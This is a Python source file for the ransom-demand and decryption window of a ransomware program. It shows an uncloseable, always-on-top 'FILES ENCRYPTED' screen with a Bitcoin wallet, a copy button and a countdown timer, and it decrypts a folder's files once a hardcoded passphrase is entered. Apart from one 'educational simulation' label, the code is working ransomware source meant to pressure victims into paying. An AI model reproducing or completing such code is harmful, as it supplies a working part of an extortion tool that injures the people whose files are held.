#!/usr/bin/env python3

import os
import hashlib
import threading
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

TARGET_FOLDER = "files"
KEY_FILE = "thekey.key"

PASS_PHRASE = "GTH3kf7"
HASH_PASS_PHRASE = hashlib.sha256(PASS_PHRASE.encode()).hexdigest()

WALLET = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"


class RansomDecryptWindow:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("FILE RECOVERY SYSTEM")

        self.root.attributes("-topmost", True)
        self.root.protocol("WM_DELETE_WINDOW", self.disable_close)

        window_width = 900
        window_height = 550

        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()

        x = (screen_width // 2) - (window_width // 2)
        y = (screen_height // 2) - (window_height // 2)

        self.root.geometry(f"{window_width}x{window_height}+{x}+{y}")
        self.root.configure(bg="#111111")
        self.root.resizable(False, False)

        # ---------------- UI ----------------
        tk.Label(
            self.root,
            text="⚠ FILES ENCRYPTED ⚠",
            font=("Arial", 22, "bold"),
            fg="red",
            bg="#111111"
        ).pack(pady=30)

        tk.Label(
            self.root,
            text="Your files were encrypted.\nSend BTC and enter key to recover access.",
            font=("Consolas", 11),
            fg="white",
            bg="#111111"
        ).pack(pady=5)

        # ---------------- WALLET ----------------
        wallet_frame = tk.Frame(self.root, bg="#111111")
        wallet_frame.pack(pady=10)

        self.wallet_entry = tk.Entry(wallet_frame, width=45, font=("Arial", 11))
        self.wallet_entry.insert(0, WALLET)
        self.wallet_entry.configure(state="readonly")
        self.wallet_entry.pack(side="left", padx=5)

        tk.Button(
            wallet_frame,
            text="COPY",
            font=("Arial", 10, "bold"),
            command=self.copy_wallet,
            bg="red",
            fg="white"
        ).pack(side="left")

        # ---------------- TIMER ----------------
        self.time_left = 300
        self.timer_label = tk.Label(
            self.root,
            text="Time remaining: 05:00",
            font=("Arial", 16, "bold"),
            fg="orange",
            bg="#111111"
        )
        self.timer_label.pack(pady=10)

        # ---------------- INPUT ----------------
        self.entry = tk.Entry(self.root, font=("Arial", 14), width=30, show="*")
        self.entry.pack(pady=10)

        tk.Button(
            self.root,
            text="Decrypt Files",
            font=("Arial", 12, "bold"),
            bg="red",
            fg="white",
            command=self.try_decrypt_thread
        ).pack(pady=10)

        tk.Label(
            self.root,
            text="Educational simulation only",
            font=("Arial", 9),
            fg="gray",
            bg="#111111"
        ).pack(pady=5)

        self.update_timer()
        self.root.mainloop()

    # ---------------- UI BLOCK ----------------
    def disable_close(self):
        pass

    # ---------------- COPY ----------------
    def copy_wallet(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(WALLET)
        messagebox.showinfo("Copied", "Wallet copied!")

    # ---------------- TIMER ----------------
    def update_timer(self):
        mins, secs = divmod(self.time_left, 60)
        self.timer_label.config(text=f"Time remaining: {mins:02d}:{secs:02d}")

        if self.time_left > 0:
            self.time_left -= 1
            self.root.after(1000, self.update_timer)
        else:
            self.timer_label.config(text="FILES LOST (SIMULATION)")

    # ---------------- THREAD ----------------
    def try_decrypt_thread(self):
        threading.Thread(target=self.try_decrypt, daemon=True).start()

    # ---------------- VERIFY ----------------
    def try_decrypt(self):
        password = self.entry.get()
        hashed = hashlib.sha256(password.encode()).hexdigest()

        if hashed == HASH_PASS_PHRASE:
            self.decrypt_files()
            self.root.after(0, lambda: messagebox.showinfo("Success", "Files decrypted successfully."))
            self.root.after(0, self.root.destroy)
        else:
            self.root.after(0, lambda: messagebox.showerror("Error", "Wrong key."))

    # ---------------- DECRYPT ----------------
    def decrypt_files(self):
        if not os.path.exists(KEY_FILE):
            return

        with open(KEY_FILE, "rb") as key:
            secretkey = key.read()

        files = [
            os.path.join(TARGET_FOLDER, f)
            for f in os.listdir(TARGET_FOLDER)
            if os.path.isfile(os.path.join(TARGET_FOLDER, f))
        ]

        for file in files:
            try:
                with open(file, "rb") as f:
                    content = f.read()

                decrypted = Fernet(secretkey).decrypt(content)

                with open(file, "wb") as f:
                    f.write(decrypted)

            except Exception:
                continue


if __name__ == "__main__":
    RansomDecryptWindow()